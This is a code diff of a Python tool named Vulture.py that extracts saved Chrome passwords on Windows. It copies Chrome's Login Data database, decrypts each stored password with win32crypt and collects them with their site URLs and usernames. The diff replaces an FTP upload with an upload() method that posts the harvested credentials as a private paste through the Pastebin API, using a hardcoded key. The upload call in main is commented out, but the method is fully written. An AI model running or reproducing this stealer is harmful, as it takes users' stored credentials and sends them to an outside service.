@@ -2,70 +2,92 @@ import sqlite3
 import win32crypt
 import getpass
 import os
-import ftplib
 import argparse
+import urllib.parse
+import urllib.request
 from tempfile import gettempdir
 from subprocess import Popen
 from shutil import copy
 
-
 class Extractor:
 
-    host = ''
-    username = ''
-    password = ''
-    save_dir = '/vulture/'
+	windows_username = os.getlogin()
 
-    def __init__(self, host, username, password):
+	key = '6fa308892fe32aad6568444477f63761'
+	url = 'http://pastebin.com/api/api_post.php'
 
-        self.host = host
-        self.username = username
-        self.password = password
+	payload = ''
 
-        try:
-            ftp_connection = ftplib.FTP(host, username, password)
-        except ConnectionRefusedError:
-            print('Failed to connect to:\nHost: {}\nUsername: {}'.format(self.host, self.username))
+	def pluck_passwords(self):
+		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(self.windows_username)
 
-    def pluck_passwords(self):
-        windows_username = os.getlogin()
-        PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(windows_username)
+		copy(PATH, gettempdir())
 
-        copy(PATH, gettempdir())
+		PATH = gettempdir() + '\\Login Data'
+		conn = sqlite3.connect(PATH)
+		cur = conn.cursor()
+		user_data = None
 
-        PATH = gettempdir() + '\\Login Data'
-        conn = sqlite3.connect(PATH)
-        cur = conn.cursor()
-        user_data = None
+		try:
+			cur.execute('SELECT action_url, username_value, password_value FROM logins')
+			user_data = cur.fetchall()
 
-        try:
-            cur.execute('SELECT action_url, username_value, password_value FROM logins')
-            user_data = cur.fetchall()
+		except Exception:
+			print('\nError fetching passwords.')
 
-        except Exception:
-            print('\nError fetching passwords.')
+		for r in user_data:
+			password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]
 
-        for r in user_data:
-            password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]
+			password = password.decode("utf-8")
+			username = r[1]
+			host = r[0]
 
-            password = password.decode("utf-8")
-            username = r[1]
-            host = r[0]
+			string = '{0}\n\t{1}\n\t{2}\n\n'.format(host, username, password)
+			self.payload += string
 
-            print(host, username, password)
-
+	def upload(self):
+		 
+		values = {
+			'api_dev_key': self.key,
+			'api_option': 'paste',
+			'api_paste_code' : self.payload,
+			'api_paste_private' : '1',
+			'api_paste_name' : 'vulture.py | {}'.format(self.windows_username),
+			'api_paste_expire_date' : 'N',
+			'api_paste_format' : 'python',
+		}
+		 
+		data = urllib.parse.urlencode(values)
+		data = data.encode('utf-8')
+		req = urllib.request.Request(self.url, data)
+		with urllib.request.urlopen(req) as response:
+		    the_page = response.read()
+		self.link = the_page.decode('utf-8')
 
 def main():
-    parser = argparse.ArgumentParser(
-        description='Vulture.py, used to grab and upload Chrome passwords to an external FTP server.')
 
-    parser.add_argument('-s', help='Server IP or host name')
-    parser.add_argument('-u', help='FTP Username')
-    parser.add_argument('-p', help='FTP Password')
-    args = parser.parse_args()
+	print('''
+       .-'`\-,/^\ .-.
+      /    |  \  ( ee\   __
+     |     |  |__/,--.`"`  `,
+     |    /   .__/    `"""",/
+     |   /    /  |
+    .'.-'    /__/
+   `"`| |';-;_`
+	  |/ /-))))))
 
-    vulture = Extractor(args.s, args.u, args.p)
+
+	Vulture.py written by Beagerr.
+
+	https://www.github.com/beagerr/vulture.py
+	  ''')
+
+	vulture = Extractor()
+	vulture.pluck_passwords()
+	# vulture.upload()
+
+	# os.system('start {}'.format(vulture.link))
 
 
 if __name__ == '__main__':
-    main()
+	main()
